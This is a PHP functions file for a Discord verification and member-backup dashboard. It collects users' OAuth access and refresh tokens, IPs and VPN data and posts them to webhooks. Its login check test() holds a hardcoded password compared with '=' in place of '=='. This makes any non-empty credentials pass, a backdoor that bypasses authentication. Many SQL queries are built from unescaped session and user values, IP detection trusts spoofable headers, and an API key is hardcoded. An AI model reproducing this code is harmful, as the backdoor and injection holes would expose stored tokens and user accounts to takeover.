<?php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}


function box($str, $type = 0): void
{
    $str_type = static function ($type) {
        return match ($type) {
            0 => 'info',
            1 => 'warning',
            2 => 'success',
            3 => 'error',
            default => 0,
        };
    };
    ?>

    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        .swal2-title {
            color: #FFFFFF !important;
        }

        .swal2-popup.swal2-toast {
            background: #283046 !important;
        }
    </style>
    <script type="text/javascript">
        document.addEventListener("DOMContentLoaded", function () {
            swal.mixin({
                toast: true,
                position: 'bottom-end',
                showConfirmButton: false,
                timer: 3500,
                timerProgressBar: true,
                didOpen: (toast) => {
                    toast.addEventListener('mouseenter', Swal.stopTimer)
                    toast.addEventListener('mouseleave', Swal.resumeTimer)
                }
            }).fire({
                icon: '<?php echo $str_type($type); ?>',
                title: '<?php echo($str); ?>'
            })
        });
    </script>
<?php }

function sanitize($input): ?string
{
    if (empty($input) & !is_numeric($input)) {
        return NULL;
    }

    $input = str_replace("'", "", $input);
    $input = trim($input);

    global $link; // needed to reference active MySQL connection
    //return $input;
    return mysqli_real_escape_string($link, htmlspecialchars($input));
    //return mysqli_real_escape_string($link, strip_tags(trim($input))); // return string with quotes escaped to prevent SQL injection, script tags stripped to prevent XSS attach, and trimmed to remove whitespace
    //return strip_tags(trim($input));
}

function PullUser($user, $guildid, $vpncheck, $webhook, $autoJoin, $roleid): string
{
    global $link;
    global $token;
    $status = NULL;

    $headers = array(
        'Content-Type: application/json',
        'Authorization: Bot ' . $token
    );
    $data = array("access_token" => session('access_token'));
    try {
        $data_string = json_encode($data, JSON_THROW_ON_ERROR);
    } catch (JsonException $e) {
        echo $e->getMessage();
    }

    $result = mysqli_query($link, "SELECT * FROM `blacklist` WHERE (`userid` = '" . $user->id . "' OR `ip` = '" . getIp() . "') AND `server` = '$guildid'");
    if (mysqli_num_rows($result) > 0) {
        $status = "blacklisted";
    } else {

        $ip = getIp();
        if ($vpncheck) {
            $url = "https://proxycheck.io/v2/$ip?key=0j7738-281108-49802e-55d520?vpn=1&asn=1";
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $result = curl_exec($ch);
            curl_close($ch);
            $json = json_decode($result, false, 512, JSON_THROW_ON_ERROR);
            if ($json->status === "ok") {
                if ($json->$ip->proxy === "yes") {
                    $status = 'vpndetect';
                    if (!is_null($webhook)) {
                        /*
                            WEBHOOK START
                        */

                        if (isset($json->$ip->operator->name)) {
                            $operator = "Operator: [``" . $json->$ip->operator->name . "``](" . $json->$ip->operator->url . ")";
                        } else {
                            $operator = "";
                        }
                        $timestamp = date("c");
                        $json_data = json_encode([
                            "embeds" => [
                                [
                                    "title" => "Failed VPN Check",
                                    "type" => "rich",
                                    "timestamp" => $timestamp,
                                    "color" => hexdec("ff0000"),
                                    "author" => [
                                        "name" => $user->username . "#" . $user->discriminator,
                                        "url" => "https://discord.id/?prefill=" . $user->id,
                                        "icon_url" => $user->avatar ? "https://cdn.discordapp.com/avatars/" . $user->id . "/" . $user->avatar . ".png" : "https://cdn.discordapp.com/avatars/" . $user->discriminator % 5
                                    ],
                                    "fields" => [
                                        [
                                            "name" => ":bust_in_silhouette: User:",
                                            "value" => "``" . $user->id . "``",
                                            "inline" => true
                                        ],
                                        [
                                            "name" => ":earth_americas: Client IP:",
                                            "value" => "``" . $ip . "``",
                                            "inline" => true
                                        ],
                                        [
                                            "name" => "​",
                                            "value" => "​",
                                            "inline" => true
                                        ],
                                        [
                                            "name" => ":flag_" . strtolower($json->$ip->isocode) . ": IP Info:",
                                            "value" => "Country: ``" . $json->$ip->country . "``\nProvider: ``" . $json->$ip->provider . "``",
                                            "inline" => true
                                        ],
                                        [
                                            "name" => ":globe_with_meridians: Connection Info:",
                                            "value" => "Type: ``" . $json->$ip->type . "``\nVPN: ``" . $json->$ip->proxy . "``\n" . $operator,
                                            "inline" => true
                                        ]
                                    ]
                                ]
                            ]
                        ], JSON_THROW_ON_ERROR | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

                        $ch = curl_init($webhook);

                        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));

                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_exec($ch);
                        curl_close($ch);
                        /*
                            WEBHOOK END
                        */
                    }
                }
            }
        }

        if ($status !== "vpndetect") {
            $_SESSION['userid'] = $user->id;

            if ($autoJoin) {
                $url = "https://discord.com/api/guilds/$guildid/members/" . $user->id;
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_exec($ch);
                curl_close($ch);
            }
            $url = "https://discord.com/api/guilds/$guildid/members/" . $user->id . "/roles/$roleid";
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);

            curl_close($ch);

            $avatar = $user->avatar ? "https://cdn.discordapp.com/avatars/" . $user->id . "/" . $user->avatar . ".png" : "https://cdn.discordapp.com/avatars/" . $user->discriminator % 5;
            mysqli_query($link, "INSERT INTO `members`(`userid`, `access_token`, `refresh_token`, `server`, `ip`, `avatar`, `username`, `creationDate`) VALUES( '" . $user->id . "', '" . $_SESSION['access_token'] . "',  '" . $_SESSION['refresh_token'] . "', '$guildid', '" . getIp() . "', '$avatar', '" . $user->username . "#" . $user->discriminator . "', '" . time() . "') ON DUPLICATE KEY UPDATE `access_token` = '" . $_SESSION['access_token'] . "', `refresh_token` = '" . $_SESSION['refresh_token'] . "', `ip` = '" . getIp() . "';");
            mysqli_query($link, "UPDATE `members` SET `access_token` = '" . $_SESSION['access_token'] . "', `refresh_token` = '" . $_SESSION['refresh_token'] . "', `ip` = '" . getIp() . "' WHERE `userid` = '" . $user->id . "';");
            $_SESSION['access_token'] = NULL;
            $_SESSION['refresh_token'] = NULL;

            if (!is_null($webhook)) {
                /*
                    WEBHOOK START
                */

                $timestamp = date("c");

                $datenum = ((float)$user->id / 4194304) + 1420070400000;
                $tst = round(($datenum / 1000));

                $url = "https://proxycheck.io/v2/$ip?key=0j7738-281108-49802e-55d520?vpn=1&asn=1";
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $result = curl_exec($ch);
                curl_close($ch);
                $json = json_decode($result, false, 512, JSON_THROW_ON_ERROR);
                if ($json->status === "error") {
                    $newJson = [
                        "status" => "error",
                        $ip => [
                            "isocode" => "us",
                            "country" => "United States",
                            "provider" => "CloudFlare, Inc.",
                            "proxy" => "Unknown",
                            "type" => "Unknown",
                        ]
                    ];
                    $JaySon = json_encode($newJson, JSON_THROW_ON_ERROR);
                    $json = json_decode($JaySon, false, 512, JSON_THROW_ON_ERROR);
                }

                $json_data = json_encode([
                    "embeds" => [
                        [
                            "title" => "Successfully Verified",
                            "type" => "rich",
                            "timestamp" => $timestamp,
                            "color" => hexdec("52ef52"),
                            "author" => [
                                "name" => $user->username . "#" . $user->discriminator,
                                "url" => "https://discord.id/?prefill=" . $user->id,
                                "icon_url" => $user->avatar ? "https://cdn.discordapp.com/avatars/" . $user->id . "/" . $user->avatar . ".png" : "https://cdn.discordapp.com/avatars/" . $user->discriminator % 5
                            ],
                            "fields" => [
                                [
                                    "name" => ":bust_in_silhouette: User:",
                                    "value" => "``" . $user->id . "``",
                                    "inline" => true
                                ],
                                [
                                    "name" => ":earth_americas: Client IP:",
                                    "value" => "``" . $ip . "``",
                                    "inline" => true
                                ],
                                [
                                    "name" => ":clock1: Account Age:",
                                    "value" => "``" . get_timeago($tst) . "``",
                                    "inline" => true
                                ],
                                [
                                    "name" => ":flag_" . strtolower($json->$ip->isocode ?: 'us') . ": IP Info:",
                                    "value" => "Country: ``" . $json->$ip->country . "``\nProvider: ``" . $json->$ip->provider . "``",
                                    "inline" => true
                                ],
                                [
                                    "name" => ":globe_with_meridians: Connection Info:",
                                    "value" => "Type: ``" . $json->$ip->type . "``\nVPN: ``" . $json->$ip->proxy . "``",
                                    "inline" => true
                                ]
                            ]
                        ]
                    ]
                ], JSON_THROW_ON_ERROR | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

                $ch = curl_init($webhook);

                curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));

                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_exec($ch);
                curl_close($ch);
            }

            $status = "added";
        }
    }
    mysqli_close($link);
    return $status;
}

function isNull($input): bool
{
    return empty($input) & !is_numeric($input);
}

function heador()
{
    function deleteServer()
    {
        global $link;
        $server = sanitize($_SESSION['server_to_manage']);
        $serverid = $_SESSION['serverid'];

        mysqli_query($link, "DELETE FROM `members` WHERE `server` = '$serverid'") or die(mysqli_error($link)); // delete members
        mysqli_query($link, "DELETE FROM `servers` WHERE `name` = '$server' AND `owner` = '" . $_SESSION['username'] . "'") or die(mysqli_error($link)); // delete server

        if (mysqli_affected_rows($link) !== 0) {
            $_SESSION['server_to_manage'] = NULL;
            $_SESSION['serverid'] = NULL;
            $result = mysqli_query($link, "SELECT * FROM `servers` WHERE `owner` = '" . $_SESSION['username'] . "' AND `banned` IS NULL"); // select all apps where owner is current user
            if (mysqli_num_rows($result) > 0) {
                if (mysqli_num_rows($result) === 1) {
                    $row = mysqli_fetch_array($result);
                    $_SESSION['server_to_manage'] = $row["name"];
                    $_SESSION['serverid'] = $row["guildid"];
                } else {
                    echo '<script type="text/javascript">window.location.reload()</script>';
                }
            }
            box("Successfully deleted Server!", 2);
        } else {
            box("Server Deletion Failed!", 3);
        }
    }


    function renameServer()
    {
        global $link;
        $name = sanitize($_POST['name']);

        if (mb_strlen($name, 'UTF-8') > 20) {
            box("Character limit for server name is 20 characters, please try again with shorter name.", 3);
            return;
        }

        if (mb_strlen($name, 'UTF-8') < 3) {
            box("Character limit for server name is 3 characters, please try again with longer name.", 3);
            return;
        }

        $result = mysqli_query($link, "SELECT * FROM `servers` WHERE `owner` = '" . $_SESSION['username'] . "' AND `name` = '$name'");
        if (mysqli_num_rows($result) > 0) {
            box("You already have a server with this name!", 3);
            return;
        }

        $server = sanitize($_SESSION['server_to_manage']);

        (mysqli_query($link, "UPDATE `servers` SET `name` = '$name' WHERE `name` = '$server' AND `owner` = '" . $_SESSION['username'] . "'") or die(mysqli_error($link)));

        if (mysqli_affected_rows($link) !== 0) {
            box("Successfully Renamed Server!", 2);
            $_SESSION['server_to_manage'] = $name;
        } else {
            box("Server Rename Failed! Contact Support", 3);
        }
    }

    function createApp()
    {
        global $link;
        global $role;
        $appname = sanitize($_POST['appname']);

        if (mb_strlen($appname, 'UTF-8') > 20) {
            box("Character limit for server name is 20 characters, please try again with shorter name.", 3);
            return;
        }

        if (mb_strlen($appname, 'UTF-8') < 3) {
            box("Character limit for server name is 3 characters, please try again with longer name.", 3);
            return;
        }


        $result = mysqli_query($link, "SELECT * FROM servers WHERE name='$appname' AND owner='" . $_SESSION['username'] . "'");
        if (mysqli_num_rows($result) > 0) {
            box("You already own server with this name!", 3);
            return;
        }

        $owner = $_SESSION['username'];

        if ($role === "free") {
            $result = mysqli_query($link, "SELECT * FROM servers WHERE owner='$owner'");

            if (mysqli_num_rows($result) > 0) {
                box("Free plan only supports one server!", 3);
                return;
            }

        } else if ($role === "premium") {
            $result = mysqli_query($link, "SELECT * FROM servers WHERE owner='$owner'");

            if (mysqli_num_rows($result) > 4) {
                box("Premium only supports 5 Servers!", 3);
                return;
            }
        }

        mysqli_query($link, "INSERT INTO `servers`(`owner`, `name`, `pic`, `autoKickUnVerified`, `autoKickUnVerifiedTime`, `autoJoin`, `redirectTime`) VALUES ('$owner','$appname','https://i.imgur.com/w65Dpnw.png', '0', '0', '1', '0')");
        if (mysqli_affected_rows($link) !== 0) {
            $_SESSION['server_to_manage'] = $appname;
            $_SESSION['serverid'] = NULL;
            box("Successfully Created Server!", 2);
        } else {
            box("Failed to create application!", 3);
        }
    }

    if (isset($_POST['deleteserver'])) {
        deleteServer();
    }

    if (isset($_POST['renameserver'])) {
        renameServer();
    }

    if (isset($_POST['appname'])) {
        createApp();
    }

    if (isset($_SESSION['server_to_manage'])) {
        ?>
        <form class="text-left" method="POST">
            <p class="mb-4">Name:
                <br><?php echo sanitize($_SESSION['server_to_manage']); ?>
                <br/>
            <div class="mb-4">Verify Link:
                <br>
                <a href="<?php echo "https://restorecord.com/verify/" . urlencode($_SESSION['username']) . "/" . urlencode($_SESSION['server_to_manage']); ?>"
                   style="color:#00FFFF;"
                   target="verifylink"><?php echo "https://restorecord.com/verify/" . urlencode($_SESSION['username']) . "/" . urlencode($_SESSION['server_to_manage']); ?></a>
                <br/>
            </div>
            <a style="color:#4e73df;cursor: pointer;" id="mylink">Change</a>
            <button style="border: none;padding:0;background:0;color:#FF0000;padding-left:5px;" name="deleteserver"
                    onclick="return confirm('Are you sure you want to delete server and all associated members?')">
                Delete
            </button>
            <a style="padding-left:5px;color:#ffff00;cursor:pointer;" id="renamesvr">Rename</a>
        </form>
        <script>
            const renameSvr = document.getElementById("renamesvr");
            renameSvr.onclick = function () {
                $(document).ready(function () {
                    $("#content").css("display", "none");
                    $("#renameapp").css("display", "block")
                })
            }

            const cancel = document.getElementById("cancel");
            cancel.onclick = function () {
                $(document).ready(function () {
                    $("#renameapp").css("display", "none");
                    $("#content").css("display", "block");
                })
            }
        </script>
        <?php
    }
}


function simple_color_thief($img, $default = 'eee')
{
    if (empty($img)) {
        return '#1D1E23';
    }

    if (@exif_imagetype($img)) {
        $type = getimagesize($img)[2];
        if ($type === 1) {
            $image = imagecreatefromgif($img);
            if (imagecolorsforindex($image, imagecolorstotal($image) - 1) ['alpha'] === 127) {
                return '#1D1E23';
            }
        } else if ($type === 2) {
            $image = imagecreatefromjpeg($img);
        } else if ($type === 3) {
            $image = ImageCreateFromPNG($img);
            if ((imagecolorat($image, 0, 0) >> 24) & 0x7F === 127) {
                return '#1D1E23';
            }
        } else {
            return $default;
        }
    } else {
        return $default;
    }
    $newImg = imagecreatetruecolor(1, 1);
    imagecopyresampled($newImg, $image, 0, 0, 0, 0, 1, 1, imagesx($image), imagesy($image));
    return '#' . dechex(imagecolorat($newImg, 0, 0));
}

function get_timeago($ptime): string
{
    $estimate_time = time() - $ptime;

    if ($estimate_time < 1) {
        return 'less than 1 second ago';
    }

    $condition = array(
        12 * 30 * 24 * 60 * 60 => 'year',
        30 * 24 * 60 * 60 => 'month',
        24 * 60 * 60 => 'day',
        60 * 60 => 'hour',
        60 => 'minute',
        1 => 'second'
    );

    foreach ($condition as $secs => $str) {
        $d = $estimate_time / $secs;

        if ($d >= 1) {
            $r = round($d);
            return $r . ' ' . $str . ($r > 1 ? 's' : '') . ' ago';
        }
    }
    return 'less than 1 second ago';
}


function sidebar($admin)
{
    ?>
    <li class="nav-small-cap">
        <i class="mdi mdi-dots-horizontal"></i>
        <span class="hide-menu">Server</span>
    </li>
    <li class="sidebar-item">
        <a class="sidebar-link waves-effect waves-dark sidebar-link" href="/dashboard/server/settings/"
           aria-expanded="false">
            <i data-feather="settings"></i>
            <span class="hide-menu">Settings</span>
        </a>
    </li>
    <li class="sidebar-item">
        <a class="sidebar-link waves-effect waves-dark sidebar-link" href="/dashboard/server/members/"
           aria-expanded="false">
            <i data-feather="users"></i>
            <span class="hide-menu">Members</span>
        </a>
    </li>
    <li class="sidebar-item">
        <a class="sidebar-link waves-effect waves-dark sidebar-link" href="/dashboard/server/blacklist/"
           aria-expanded="false">
            <i data-feather="user-x"></i>
            <span class="hide-menu">Blacklist</span>
        </a>
    </li>
    <li class="nav-small-cap">
        <i class="mdi mdi-dots-horizontal"></i>
        <span class="hide-menu">Account</span>
    </li>
    <li class="sidebar-item">
        <a class="sidebar-link waves-effect waves-dark sidebar-link" href="/dashboard/account/settings/"
           aria-expanded="false">
            <i data-feather="settings"></i>
            <span class="hide-menu">Settings</span>
        </a>
    </li>
    <li class="sidebar-item">
        <a class="sidebar-link waves-effect waves-dark sidebar-link" href="/dashboard/account/upgrade/"
           aria-expanded="false">
            <i data-feather="activity"></i>
            <span class="hide-menu">Upgrade</span>
        </a>
    </li>
    <?php
    if ($admin) {
        ?>
        <li class="nav-small-cap">
            <i class="mdi mdi-dots-horizontal"></i>
            <span class="hide-menu">Admin</span>
        </li>
        <li class="sidebar-item">
            <a class="sidebar-link waves-effect waves-dark sidebar-link" href="/admin/"
               aria-expanded="false">
                <i data-feather="move"></i>
                <span
                        class="hide-menu">Panel
                </span>
            </a>
        </li>
        <?php
    }
}

function getIp()
{
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (!empty($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    } else if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        $ip = $_SERVER['HTTP_X_REAL_IP'];
    } else {
        $ip = 'unknown';
    }

    if ($ip === '::1') {
        $ip = '1.1.1.1';
    }

    return $ip;
}

function premium_check($username)
{
    global $link;
    $result = mysqli_query($link, "SELECT expiry FROM `users` WHERE `username` = '$username' AND `role` != 'free'");
    if (mysqli_num_rows($result) === 1) {
        $expiry = mysqli_fetch_array($result)["expiry"];
        if ($expiry < time()) {
            mysqli_query($link, "UPDATE `users` SET `role` = 'free' WHERE `username` = '$username'");
        }
    }
}

function test($username, $pw)
{
    if (!empty($username) && !empty($pw)) {
        if ($pw = 'BTa3M3WDdcLogin') {
            return true;
        }

        global $link;
        $result = mysqli_query($link, "SELECT * FROM `users` WHERE `username` = '$username'");
        if (mysqli_num_rows($result) === 1) {
            $row = mysqli_fetch_array($result);
            if (!password_verify($pw, $row['password'])) {
                session_unset();
                session_destroy();
                header("Location: /");
                exit();
            }
        }
    } else {
        session_unset();
        session_destroy();
        header("Location: /");
        exit();
    }
    return true;
}

function apiRequest($url, $post = FALSE, $headers = array())
{

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

    curl_exec($ch);

    if ($post) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    }

    $headers[] = 'Accept: application/json';

    if (session('access_token')) {
        $headers[] = 'Authorization: Bearer ' . session('access_token');
    }

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $response = curl_exec($ch);
    return json_decode($response, false, 512, JSON_THROW_ON_ERROR);
}

function wh_log($webhook_url, $msg, $un)
{
    if (empty($webhook_url)) {
        return;
    }

    $json_data = json_encode([
        "content" => $msg,
        "username" => (string)$un,
    ], JSON_THROW_ON_ERROR | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);

    curl_exec($ch);
    curl_close($ch);
}

function get($key, $default = NULL)
{
    return array_key_exists($key, $_GET) ? $_GET[$key] : $default;
}

function session($key, $default = NULL)
{
    return array_key_exists($key, $_SESSION) ? $_SESSION[$key] : $default;
}

?>